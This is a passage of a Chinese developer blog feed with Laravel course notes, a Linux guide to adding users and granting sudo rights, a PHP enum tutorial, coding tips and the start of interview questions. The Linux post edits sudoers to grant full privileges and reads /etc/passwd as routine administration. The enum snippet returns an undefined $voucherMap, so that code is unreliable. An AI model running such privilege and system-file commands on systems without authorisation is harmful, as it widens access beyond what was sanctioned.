&#39;UsersController@show&#39;)-&gt;name(&#39;users.show&#39;);</span><br></pre></td></tr></table></figure><p>控制器及模型代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use App\Models\User;</span><br><span class="line"></span><br><span class="line">public function show (User $user)&#123;</span><br><span class="line">  return view(&quot;users.show&quot;, compact(&quot;user&quot;)); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这段代码有很多知识点：</p><ol><li>控制器方法<code>show</code> 是通过路由获取的</li><li><code>User $user</code> 是定义在控制器中的方法的Eloquent 模型类型声明</li><li>由于show 方法传参时声明了类型——Eloquent 模型，对应的变量名<code>$user</code> 会匹配路由片段中的<code>{user}</code>，这样Laravel 会自动注入与请求URL 传入的ID 对应的用户模型实例。</li></ol><p>这里利用了隐形路由绑定，直接读取对应ID 的用户的实例。</p><p>其实这个和ThinkPHP 中的路由传参很像，只不过不同的是ThinkPHP 中没有定义模型。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Route::get(&#39;hello&#x2F;:name&#39;, &#39;index&#x2F;hello&#39;);</span><br><span class="line"></span><br><span class="line">public function hello($name)&#123;</span><br><span class="line">  return $name;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Laravel 是如何接收前端的参数的？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function sotre(Request $request)&#123;</span><br><span class="line">  &#x2F;&#x2F; 通过使用Illuminate\Http\Request 实例来接收用户输入</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="第四章学到了什么"><a href="#第四章学到了什么" class="headerlink" title="第四章学到了什么"></a>第四章学到了什么</h3><ol><li>使用RESTFUL 来构建路由资源</li><li>通过表单与控制器协同处理数据</li><li>验证表单提交的数据，并返回相应的内容</li><li>利用Composer 安装相应扩展包</li><li>使用闪存来展示用户信息</li></ol><h2 id="第五章"><a href="#第五章" class="headerlink" title="第五章"></a>第五章</h2><p>Laravel 提供了<code>attempt</code> 方法用于登录验证。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (Auth::attempt([&#39;email&#39; &#x3D;&gt; $email, &#39;password&#39; &#x3D;&gt; $password])) &#123;</span><br><span class="line">    &#x2F;&#x2F; 该用户存在于数据库，且邮箱和密码相符合</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>attempt</code> 方法接收一个数组作为第一个参数，会去数据库中找寻对应的值，逻辑如下：</p><ol><li>找寻<code>email</code>字段匹配的值</li><li>如果没找到，直接返回false</li><li>如果能找到：<br>i. 先将传参password进行加密，与数据库中的值进行比对<br>ii. 如果两个值匹配，会创建一个会话给验证通过的用户，在会话创建的同时，也会种下一个名为 laravel_session 的 HTTP Cookie，以此 Cookie 来记录用户登录状态，最终返回 true<br>iii. 如果不匹配，返回false</li></ol><p>登录成功之后，可以使用<code>Auth::user()</code> 获取用户信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Route::get(&#39;login&#39;, &#39;SessionsController@create&#39;)-&gt;name(&#39;login&#39;);</span><br></pre></td></tr></table></figure><p>通过<code>name()</code> 方法定义路由名称，这样需要访问该路由时，直接访问该名称就好。</p><h3 id="第五章学到了什么"><a href="#第五章学到了什么" class="headerlink" title="第五章学到了什么"></a>第五章学到了什么</h3><ol><li>Auth 认证的使用</li><li>了解Laravel 常用登录机制的具体实现</li><li>集成Bootstrap Javascript 组件</li><li>通过 “记住我” 来记住用户登录状态</li></ol><h2 id="第六章"><a href="#第六章" class="headerlink" title="第六章"></a>第六章</h2><p>通常开发编辑用户时，需要先从数据库中获取到该用户当前的信息，然后再进行编辑。</p><p>在Laravel 中，只需要几行代码就可以完成这件事情。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function edit(User $user)&#123;</span><br><span class="line">  return view(&quot;users.edit&quot;, compact(&quot;user&quot;))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里通过『隐形路由绑定』，把对应ID 的用户的实例作为控制器参数。</p><h3 id="中间件访问限制"><a href="#中间件访问限制" class="headerlink" title="中间件访问限制"></a>中间件访问限制</h3><p>有时我们会希望未登录的用户，不能访问某些功能，这时可以通过 Auth 提供的中间很方便的完成。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;middleware(&quot;auth&quot;, [</span><br><span class="line">    &#x2F;&#x2F; 指定这几个方法不使用Auth 去验证</span><br><span class="line">    &quot;except&quot; &#x3D;&gt; [&quot;show&quot;, &quot;create&quot;, &quot;store&quot;, &quot;index&quot;, &quot;confirmEmail&quot;]</span><br><span class="line">]);</span><br></pre></td></tr></table></figure><h3 id="授权验证"><a href="#授权验证" class="headerlink" title="授权验证"></a>授权验证</h3><p>但需要注意的时，这里仅仅限制的是未登录，而有些功能则是需要在登录状态下进行限制，比如：ID 为1 的用户不能修改ID 为2 的用户的信息。</p><p>这个就不是中间件职责范围内能做的事情了，这个需要授权策略来完成。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 定义策略</span><br><span class="line">public function update(User $currentUser, User $user)</span><br><span class="line">&#123;</span><br><span class="line">    return $currentUser-&gt;id &#x3D;&#x3D;&#x3D; $user-&gt;id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还需要在控制器中验证才算正真使用了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 使用策略</span><br><span class="line">public function update(User $user)</span><br><span class="line">&#123;</span><br><span class="line">    $this-&gt;authorize(&quot;update&quot;, $user);</span><br><span class="line">    &#x2F;&#x2F; ... </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="数据填充"><a href="#数据填充" class="headerlink" title="数据填充"></a>数据填充</h3><p>数据填充需要使用Seeder 类，如果需要进行数据填充，需要调用 Seeder 的call 方法。</p><p>以用户模型为例，填充步骤如下：</p><ol><li><p>首先创建用户工厂，定义填充数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ php artisan make:factory UserFactroy</span><br></pre></td></tr></table></figure></li><li><p>创建用户生成器，实现run 方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ php artisan make:seeder UsersTableSeeder</span><br></pre></td></tr></table></figure></li><li><p>在DatabaseSeeder 类中实现run 方法，调用 call 方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public function run()</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; \App\Models\User::factory(10)-&gt;create();</span><br><span class="line">    Model::unguard();</span><br><span class="line"></span><br><span class="line">    $this-&gt;call(UsersTableSeeder::class);</span><br><span class="line">  </span><br><span class="line">    Model::reguard();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>重置数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ php artisan migrate:refresh</span><br></pre></td></tr></table></figure></li><li><p>填充数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php artisan db:seed</span><br></pre></td></tr></table></figure></li></ol><h3 id="第六章学到了什么"><a href="#第六章学到了什么" class="headerlink" title="第六章学到了什么"></a>第六章学到了什么</h3><ol><li>通过路由传参与控制器进行交互（隐形路由绑定</li><li>使用Patch 动作更新用户信息，Delete 动作删除用户</li><li>使用Auth 中间件过滤用户请求、guest 中间件</li><li>使用权限策略，对一些必要的动作进行权限验证</li><li>使用数据填充来生成假数据</li><li>重置数据库以及迁移数据库并生成新数据</li><li>通过数据库迁移来进行数据库字段的更新</li></ol><h3 id="第七章"><a href="#第七章" class="headerlink" title="第七章"></a>第七章</h3><p>什么时候应该在控制器中增加<code>User $user</code> 这样的代码呢？</p><p>看路由，看路由，看路由，看路由是如何定义的。</p><p>如果路由中有这样的东西，那么一定要是要的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Route::get(&quot;&#x2F;users&#x2F;&#123;user&#125;&quot;, &quot;UserController@show&quot;)-&gt;name(&quot;users.show&quot;);</span><br></pre></td></tr></table></figure><p>这是为什么呢？因为隐形路由绑定。</p><p>这里还有一个细节就是如何判断一个路由或者一个控制器是否是隐形路由绑定？<br>除了只是看路由之外，还需要看是否有与之对应的模型。这一点很重要哦。</p><p>另外什么时候需要<code>Request $request</code> 呢？也是看路由，Post 方法一定需要的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 定义路由</span><br><span class="line">Route::get(&quot;password&#x2F;&#123;token&#125;&quot;, &quot;PasswordController@showResetForm&quot;)-&gt;name(&quot;password.reset&quot;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 方式一</span><br><span class="line">public function showResetForm($token)&#123;</span><br><span class="line">  var_dump($token);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 方式二</span><br><span class="line">public function showResetForm(Request $request)&#123;</span><br><span class="line">  $token &#x3D; $request-&gt;route()-&gt;parameter(&#39;token&#39;);</span><br><span class="line">  var_dump($token);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Laravel 中的几种操作数据库的方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public function store(User $user)&#123;</span><br><span class="line">  &#x2F;&#x2F; 方式一</span><br><span class="line">  $user-&gt;name &#x3D; &quot;boo&quot;;</span><br><span class="line">  $user-&gt;save();</span><br><span class="line">  </span><br><span class="line">  &#x2F;&#x2F; 方式二</span><br><span class="line">  $user-&gt;update([</span><br><span class="line">    &quot;name&quot; &#x3D;&gt; &quot;boo&quot;,</span><br><span class="line">  ]);</span><br><span class="line">  </span><br><span class="line">  &#x2F;&#x2F; 方式三</span><br><span class="line">  User::where(&quot;id&quot;, $user-&gt;id)-&gt;update([</span><br><span class="line">    &quot;name&quot; &#x3D;&gt; &quot;boo&quot;,</span><br><span class="line">  ]);</span><br><span class="line">  </span><br><span class="line">  &#x2F;&#x2F; 方式四</span><br><span class="line">  DB::table(&quot;users&quot;)-&gt;where(&quot;id&quot;, $user-&gt;id)-&gt;update([</span><br><span class="line">    &quot;name&quot; &#x3D;&gt; &quot;boo&quot;,</span><br><span class="line">  ]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="第七章学到了什么"><a href="#第七章学到了什么" class="headerlink" title="第七章学到了什么"></a>第七章学到了什么</h3><ul><li>使用迁移为数据库表增加字段</li><li>在模型中，定义监听器，监听操作</li><li>使用Laravel 发送邮件功能</li><li>在本地（log）调试发送邮件功能</li><li>通过邮件发送注册链接来激活用户</li><li>通过邮件来找回密码</li></ul><h2 id="第八章"><a href="#第八章" class="headerlink" title="第八章"></a>第八章</h2><blockquote><p>Laravel 中模型与模型之间是如何进行关联的呢？</p></blockquote><p>答案是通过主键与外键进行关联。</p><p>通过Eloquent 关联模型与模型之间的关系：</p><ol><li>一对一</li><li>一对多</li><li>多对一</li><li>多对多</li></ol><p><code>Auth::user()</code> 方法可以获取到当前用户的实例。</p><p>在User模型中定义了一个方法，然后通过<code>Auth::user()</code>获取到的实例进行调用。</p><p>如果没有一对多的关系，需要这样创建一条微博：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">App\Models\Status::create()</span><br></pre></td></tr></table></figure><p>如果将用户模型与微博模型进行关联之后，可以得到以下方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$user-&gt;statuses()-&gt;create()</span><br></pre></td></tr></table></figure><p>其中<code>statuses()</code> 是在用户模型中定义好的（名称可以不一样)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function statuses()</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; user表正向关联 status表</span><br><span class="line">    return $this-&gt;hasMany(Status::class, &quot;user_id&quot;, &quot;id&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="第八章学到了什么"><a href="#第八章学到了什么" class="headerlink" title="第八章学到了什么"></a>第八章学到了什么</h3><ul><li>两个模型之间如何进行关联</li><li>通过模型关联获取数据</li><li>对微博发布时间进行友好处理，并中文化</li><li>建立工厂、以及生成器、并生成假数据</li><li>通过数据关联来创建微博</li><li>通过数据关联来删除微博</li><li>修复批量赋值的错误</li></ul><h2 id="第九章"><a href="#第九章" class="headerlink" title="第九章"></a>第九章</h2><p>正式写SQL 之前，可以先使用tinker 通过模型操作数据。</p><p>通过在模型中定义一些方法，以便可以在其他地方直接获取到数据。</p><h3 id="第九章学到了什么"><a href="#第九章学到了什么" class="headerlink" title="第九章学到了什么"></a>第九章学到了什么</h3><ul><li>多对多关系应用</li><li>新增和销毁多对多关联</li><li>使用 with 来避免N+1 问题  </li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://learnku.com/courses/laravel-essential-training/8.x&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;L01 Laravel 教程- Web 开发实战入门&lt;/a&gt;课程笔记。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    <category term="Laravel" scheme="https://www.0x2beace.com/categories/PHP/Laravel/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Laravel" scheme="https://www.0x2beace.com/tags/Laravel/"/>
    
  </entry>
  
  <entry>
    <title>Linux 添加用户及提权</title>
    <link href="https://www.0x2beace.com/linux-to-add-users-and-rights/"/>
    <id>https://www.0x2beace.com/linux-to-add-users-and-rights/</id>
    <published>2021-03-12T14:04:50.000Z</published>
    <updated>2021-03-13T04:18:51.999Z</updated>
    
    <content type="html"><![CDATA[<p>刚拿到一台服务器时，通常会禁用root 用户登录，而使用其他普通用户，这时就需要创建一个新用户。</p><a id="more"></a><h2 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h2><p>创建一个新用户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ useradd boo</span><br></pre></td></tr></table></figure><p>设置密码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ passwd boo</span><br></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>此时此用户已经可以正常使用了，但是还没有提权，所以很多事情做不了，这时可以把该用户加入<code>sudo</code> 用户组，通过<code>sudo</code>命令来进行提权。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ usermod -G sudo boo</span><br></pre></td></tr></table></figure><p>一般直接就加入成功了，但是有些发行版本默认并没有<code>sudo</code>用户组，所以这时需要先添加用户组。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ groupadd sudo</span><br></pre></td></tr></table></figure><p>手动添加完用户组之后，还需要修改<code>sudoers</code>配置文件，这里有几种方式，根据实际情况进行选择：</p><ol><li>允许<code>sudo</code> 组的成员执行任何命令</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sudo visudo &#x2F;&#x2F; 或者 sudo vim &#x2F;etc&#x2F;sudoers</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 添加以下内容</span><br><span class="line"># the &#39;sudo&#39; group has all the sudo privileges</span><br><span class="line">%sudo ALL&#x3D;(ALL:ALL) ALL</span><br></pre></td></tr></table></figure><ol start="2"><li>直接允许该用户执行任何命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sudo visudo </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 添加以下内容，注意：没有% </span><br><span class="line"># Allow boo to run any commands anywhere</span><br><span class="line">boo ALL&#x3D;(ALL:ALL) ALL</span><br></pre></td></tr></table></figure></li></ol><p>通常还是建议将用户添加至<code>sudo</code> 用户组，然后赋予<code>sudo</code> 组成员权限，而不是直接对具体某个用户进行提权。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>查看所有用户的列表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>查看所有用户组：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat &#x2F;etc&#x2F;group</span><br></pre></td></tr></table></figure><p>查看当前登入用户的组：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ groups</span><br></pre></td></tr></table></figure><p>查看指定用户所在的组：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ groups usernmae</span><br></pre></td></tr></table></figure><p>添加用户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ useradd username</span><br></pre></td></tr></table></figure><p>设置(重置)密码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ passwd username</span><br></pre></td></tr></table></figure><p>添加用户组：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ groupadd group_name</span><br></pre></td></tr></table></figure><p>将某个用户添加到某个组：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ usermod -G group_name username</span><br></pre></td></tr></table></figure><p>编辑sudoers 配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo visudo</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;刚拿到一台服务器时，通常会禁用root 用户登录，而使用其他普通用户，这时就需要创建一个新用户。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>如何在 PHP 中使用枚举</title>
    <link href="https://www.0x2beace.com/how-do-I-use-enumerations-in-php/"/>
    <id>https://www.0x2beace.com/how-do-I-use-enumerations-in-php/</id>
    <published>2021-03-08T12:57:51.000Z</published>
    <updated>2021-03-08T12:59:13.169Z</updated>
    
    <content type="html"><![CDATA[<p>在编写业务代码时，常常会遇到状态或者类型不一致造成的逻辑分支，这时，最忌讳的是直接在业务代码中对数值进行判断。</p><a id="more"></a><p>那么更好的方式应该是怎样呢？<strong>使用枚举</strong>。</p><p>使用枚举有以下几个好处：</p><ol><li>减少因为直接输入数字而导致的错误</li><li>使代码更易于阅读</li><li>方便维护，后面需要添加新的类型时，不会突兀</li></ol><p>PHP 本身不支持枚举，但是使用类中的常量去定义可以实现等价的效果。</p><h2 id="定义枚举"><a href="#定义枚举" class="headerlink" title="定义枚举"></a>定义枚举</h2><p>下面为用户类型创建一个枚举，用户可以是以下三种类型之一：</p><ol><li>普通用户</li><li>管理员</li><li>超级管理员</li></ol><p>看起来像这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class UserType extends Enum</span><br><span class="line">&#123;</span><br><span class="line">  const MEMBER &#x3D; 1;</span><br><span class="line">  const ADMIN &#x3D; 2;</span><br><span class="line">  const SUPERADMIN &#x3D; 3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="使用枚举"><a href="#使用枚举" class="headerlink" title="使用枚举"></a>使用枚举</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ($user-&gt;type &#x3D;&#x3D;&#x3D; UserType::MEMBER)&#123;</span><br><span class="line">  &#x2F;&#x2F; todo </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们不使用枚举，代码可能就会变成这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if ($user-&gt;type &#x3D;&#x3D;&#x3D; 1) &#123; &#x2F;&#x2F; 这个1表示什么??</span><br><span class="line">    &#x2F;&#x2F; todo</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($user-&gt;type &#x3D;&#x3D;&#x3D; &#39;Member&#39;) &#123; &#x2F;&#x2F; 这他妈咋么又是字符串 😞</span><br><span class="line">    &#x2F;&#x2F; todo </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="定义获取器"><a href="#定义获取器" class="headerlink" title="定义获取器"></a>定义获取器</h2><p>很多时候我们希望能获取到某个类型对应的具体含义，这时可以通过定义获取器来获取。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class UserType extends Enum</span><br><span class="line">&#123;</span><br><span class="line">  public static $userType &#x3D; [</span><br><span class="line">  self::MEMBER &#x3D;&gt; &quot;普通会员&quot;,</span><br><span class="line">  self::ADMIN &#x3D;&gt; &quot;管理员&quot;,</span><br><span class="line">  self::SUPERADMIN &#x3D;&gt; &quot;超级管理员&quot;</span><br><span class="line">  ];</span><br><span class="line">  </span><br><span class="line">  public static function getUserType($type)</span><br><span class="line">  &#123;</span><br><span class="line">  return self::$voucherMap[$type];</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样当我们在调用<code>getUserType</code> 方法时，只需要传入对应的类型，就能获取到<code>普通会员</code>、<code>管理员</code>、<code>超级管理员</code>了。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://learnku.com/laravel/t/36091" target="_blank" rel="noopener">在 Laravel 中使用枚举</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;在编写业务代码时，常常会遇到状态或者类型不一致造成的逻辑分支，这时，最忌讳的是直接在业务代码中对数值进行判断。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>写代码的好习惯</title>
    <link href="https://www.0x2beace.com/good-habit-of-writing-code/"/>
    <id>https://www.0x2beace.com/good-habit-of-writing-code/</id>
    <published>2021-03-02T14:20:53.000Z</published>
    <updated>2021-04-10T01:52:32.612Z</updated>
    
    <content type="html"><![CDATA[<p>前段时间看到一篇比较火的文章，结合自己的一些经验，整理以下“好习惯”。</p><a id="more"></a><ol><li>修改完代码，一定要记得自测一下，即使只是改了一个变量。</li><li>方法入参尽量都做校验。</li><li>添加新接口时，需要注意老接口的兼容性。</li><li>对于复杂的代码逻辑，有必要写清楚注释。</li><li>使用完IO 资源流，一定要记得关闭。</li><li>尽量不要在循环里远程调用或者数据库操作，特别是select。优先考虑批处理。</li><li>考虑并发一致性的问题。</li><li>根据实际的业务场景去拆解功能，不是所有的功能都需要用特别高深的技术去实现。</li></ol><hr><ol><li>避免多层<code>if...else</code>嵌套。</li><li>一个类做好一件事情，一个控制器维护好一个功能。</li></ol><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://mp.weixin.qq.com/s/Iv5xWG6GZK7goq0BMZjh4w" target="_blank" rel="noopener">写代码有这16个好习惯，可以减少80%非业务的bug</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;前段时间看到一篇比较火的文章，结合自己的一些经验，整理以下“好习惯”。&lt;/p&gt;</summary>
    
    
    
    <category term="碎碎念" scheme="https://www.0x2beace.com/categories/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    
    
    <category term="碎碎念" scheme="https://www.0x2beace.com/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    
  </entry>
  
  <entry>
    <title>PHP 常见面试题整理</title>
    <link href="https://www.0x2beace.com/php-common-interview-questions/"/>
    <id>https://www.0x2beace.com/php-common-interview-questions/</id>
    <published>2021-02-25T11:51:45.000Z</published>
    <updated>2021-03-12T14:05:10.121Z</updated>
    
    <content type="html"><![CDATA[<p>年前年后这段时间一直在为面试做准备，本文将从网络、PHP、Mysql、Redis、Linux 这几部分整理一下常见的一些面试简答题。</p><a id="more"></a><h2 id="网络篇"><a href="#网络篇" class="headerlink" title="网络篇"></a>网络篇</h2><h3 id="常见的状态码及其含义"><a href="#常见的状态码及其含义" class="headerlink" title="常见的状态码及其含义"></a>常见的状态码及其含义</h3><table><thead><tr><th>状态码</th><th>含义</th></tr></thead><tbody><tr><td>200</td><td>请求成功</td></tr><tr><td>301</td><td>重定向</td></tr><tr><td>304</td><td>资源未被修改可以使用旧资源</td></tr><tr><td>404</td><td>资源找不到</td></tr><tr><td>403</td><td>请求被拒绝</td></tr><tr><td>500</td><td>服务端错误</td></tr><tr><td>502</td><td>网关错误</td></tr><tr><td>504</td><td>网关超时</td></tr></tbody></table><h3 id="表单提交-get-和-post-的区别"><a href="#表单提交-get-和-post-的区别" class="headerlink" title="表单提交 get 和 post 的区别"></a>表单提交 get 和 post 的区别</h3><ol><li>Get 请求是将请求参数放在 url 后面，等同于直接放在了请求头中，Post 请求则是把请求参数放在请求体中。</li><li>Post 更安全，不会作为url的一部分，不会被缓存及保存在浏览器记录中。</li><li>Post 能发送更多的内容及更多的数据类型，get 只能发送 2048 个ASCII 字符</li><li>Post 比Get 慢（原因是因为post 需要在服务器确认之后再发送数据）</li><li>Get 通常用于资源的获取，Post 通常用于资源的更新</li></ol><h3 id="http-和-https-的区别"><a href="#http-和-https-的区别" class="headerlink" title="http 和 https 的区别"></a>http 和 https 的区别</h3><ol><li>首先两者所使用的协议不一样，其端口也不一样。</li><li>这也是https 比 http 要安全的原因，http 是明文传输，数据都是未加密的，而https 则是 ssl + http 协议进行加密传输。</li><li>http 比 https 要快，这是因为http 只需要进行tcp 三次握手连接，只需要交换三个包，而 https 除了进行tcp 连接，还需要 ssl 握手的九个包，一共是十二个包。</li><li>https 是构建在http 之上的协议，理论上，https 相较 http 会更消耗服务器资源。</li></ol><h3 id="session-和-cookie-的区别"><a href="#session-和-cookie-的区别" class="headerlink" title="session 和 